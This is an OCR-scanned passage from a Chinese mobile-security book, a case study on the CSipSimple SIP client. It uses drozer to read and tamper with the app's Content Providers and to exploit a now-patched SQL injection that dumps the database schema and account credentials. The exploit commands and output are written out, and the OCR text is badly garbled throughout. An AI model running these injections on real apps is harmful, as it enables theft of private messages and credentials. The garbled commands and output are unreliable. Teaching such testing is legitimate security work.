query 模块，以 Content Provider URI作为参数：
dz> run app -provider,query content ://com.csipsimple.db/messages
] id | sender | receiver 
Icontact
1 body
[mime_type |type |date
|status |read |ful1_sender
[  1 ISzLF
|sip:boblostel.co | sip:bob@ostel ,co| ltello1 1
text/plain I 5
|1372293408925 ∣405
1 1
||
结果将返回数据存储的列名和每行数据，在本例中，在Content Provider接口后台是 SQLite
数据库。现在你已经可以访问到这些即时通信消息日志了，这些数据对应于图4-8所示的消息
Activity/截屏。
?
bob
图4-8CSipSimple 的消息记录截屏
---
## Page 116
100第4章云计算的安全风险
你还可以使用app.provider.update模块，尝试对这些ContentProvider接口进行写操作
或者更新。你需要传递 Content Provider URI，指定查询约束的 selection 和 selection-args
参数，你想要替换的列名，以及替换的数据。这里我们将receiver和body列的原始值修改为
一些看起来更邪恶的值：
dz> run app -provider,update content : //com,csipsimple,db/messages
--string fu11_sender **
Done.
将receiver 从bob@ostel,co 修改为 badguy@ostel,co，面message 从Hello！修改
为omgcrimes，图4-9显示了更新后的屏幕截图。
你也看到了calllogs接口，同样你也可以查询：
dz> run app ,provi.der,query content://con,csipsimple.db/ca111ogs
1_id ] name 1 numberlebel ] numbertype | date
new | nunber
| type | account_id | status_code | status_
1duration |
1 5 |mul1 | nu11
text
10
[1372294364590 1286
10
|*Bob*  1 1
|1
00z 1
|Normal  cal1  clearing 1
4
|nul1 Inul1
10
[1372294151478 ∣34
1 0
|
|1
1200
1 Normal call elearing 1
+ + +
图4-9修改后CSipSimple的消息记录截屏
与=essages 接口和消息屏幕截图非常相似，图4-10中的屏幕显示了cal1logs的数据。
---
## Page 117
4.3案例分析：SIP客户端
101
图4-10CSipSimple的呼叫记录截屏
这个数据也可以通过一个简单的命令进行更新，使用一个查询约束来更新以bobaostel.co
为目的的所有记录：
dz> run app ,provider,update content://com.csipsiaple,db/ca111ogs
--selection *number=?* --selectionargs
**
--string nunber **
Done 
图4-11显示了呼叫记录更新之后的屏幕截图。
图4-11修改后CSipSimple的呼叫记录截屏
---
## Page 118
102第4章云计算的安全风险
4.3.4注入
ContentProvider接口如果没有进行充分的输人验证，或者查询语句构建处理方式不恰当（比
如对用户输人进行未经过滤的连接）那么就会存在注人漏洞。这会以多种形式显现出来，比如
针对以SQLite为后台ContentProvider接口的SQL注入，以及以文件系统为后台ContentProvider
接口的目录遍历。Drozer提供了发现这些间题的多个模块，如scanner.provider，traversal
和scanner.provider.injection模块。运行scanner.provider.injection模块可以发
现出CSipSimple中的SQL注人安全漏润。
dz> run scanner.provider.injectlon -a com,csipsinple
Scanning com,csipsimple...
Not Vulnerable :
content://com.csipsimple.prefs/raz
content://com.csipsimple.db/
content://com.csipeimple.pref8/
content://com,csipsimple db/accounta_status/
Injeetion in Projeetion:
content://com,csipsimple db/ca111ogs
content://com.csipsimple. db/outgoing_filters
content1/ /com, csipsimple.db/accounts/
content://com,csipsimple.db/accounts
 1 +
Injection in Selection:
content: //com,ceipsimple.db/thread/
content:/ /com, csipsimple.db/ca111ogs
content: //com.csipsimple db/outgoing_fi1ters
在多个ContentProvider接口以同一SQLite数据库作为后台的情况下，与Web应用中的传统
SQL注人非常类似，你可以获取到其他表中的内容。首先，查看这些ContentProvider接口后台
数据库中到底有哪些数据内容，你可以再次使用app.provider.query模块来查询calllogs
接口，但这次你可以加上一个projection参数来指定你所选择的列名，可以输人*FROM
SQLITE_MASTER--来获取 SQLite数据库的 schema。
dz> run app-provider,query content ://com,esipeimple,db/ca111oge
-projection ** FROM SQLITE_MASTER--
I type  I name
|tbl_nane
[bs |obedoox |
| table |android_metadata |android_metadata | 3
I CREATE TABLE
android_metadata (1ocale TExT)
|table |aceounts
Iaccounts
14
1CREATE TABLE
accounts (id INTEGRR PRIHARY KEY AUTOINCREMENr,active INTEGER, wizard
riority INTEGER, acc_id rExT NOT NULL,reg_uri TEXr,mMi_enabled BOOLEAN,
TEXT, display_name TEXT,p
publish_enabled INrEGER, reg_timeout INrBGER, ka_interval INTEGER,pidf_tuple_id
TEXT, force_contac
---
## Page 119
4.3案例分析：SIP客户端
103
t TEXr, allow_contact_rewrite INEGER., contact_rewrite_method INrEGER,
INTBG&R, default_uri_scheme TEXr,use_srtp IN
scheme TEXT, username TEXT, datatype INrEGER, data TExr, initial_auth
INTBG&R, auth_algo TEXT, sip_stack
use_rfc5626 INrEGER DEFAULr 1,rfc5626_instance_id TEXr,rfc5626_reg_id
INTBG&R, vm_nbr TEXT,reg_dbr INTEGER, try_clean_reg INTBGBR,
TEXT,vid_in_auto_show INTEGER DBFAUL
 -1,vid_out_auto_transmit INTEGER D&FAULT -1,rtp_port INrBGER DEFAULr -
1, rtp_bound_addr TExr, rtp_P
1, rtp_enable_Qos INTEGER DEFAULT -1,rtp_qos_dscp INTEGER DEFAULT
ub1ic_addr TEXT,android_group r&xT,allov_via_rewrite INrsG&R D8FAULr 0,
-1, ice_cfg_enable INTEGER DEFAULT 0,turn_cfg_use INrEGER DEFAULT -1,
INTEGER DEFAULT
turn_cfg_enable INTBGBR DBFAULT 0, turn_cfg_server TEXT, turn_cfg_user
media_use INTEGER DEFAULr 0, wizard_data TEXT) |
TEXT, turn_cfg_pvd TExT, iIpv6_
| table | sqlite_sequence
1sqlite_sequence|5
1 CREATE TABLE
sqlite_seguence (nane, seg)
你可以看到有个名为accounts的表，推测里面包含登录凭据等账号数据。你可以在查询的
projection参数中使用非常简单的SQL注人语句，获取在accounts表中的数据，其中包含登
录凭证。这次你在查询中可以使用*FROMaccounts--参数值：
dz> run app-provider query content1//con,caipsimple db/ca111ogs
--projection ** FROM accounts--*
| id | active 1 wizard I display_name | priority 1 acc_id
pidf_tuple_id | force_contact | allow_contact_rewrite
I reg_uri
1mwi_enabled 1 publish_enabled | reg_timeout | ka_interval 1
contact_rewrite_method | contaet_parans | contact_uri_parans | transport
default_uri_scheme
xzsndxsasn 
proxy
reg_use_proxy rea1m Iseheme |
|initial_auth | auth_algo 1 sip_stack |
username l datatype
data
 ∣sip:ostel,co |1
/1
1 1
1OSTN
NLSO1
1100
1nu11
I1
11800
01
1_nu11
1 2 
1 nu11
|nu11
sip
1 -1
I 1
∣sips:ostel.co:5061 |3
3
|0
|nu11
10
1*98
1 -1 
I 1
11
+ + +
注意
前面讨论的CSipSimple应用中的安全漏洞已经被修补。CONFIGURE_SIP权限被从
android.permission移动到一个更明确的命名空间，并提供了用法与影响的更详细描
述。另外，在Content Provider接口中的SQL注入漏润也被修补了，这进一步限制了对数
感信息的访问。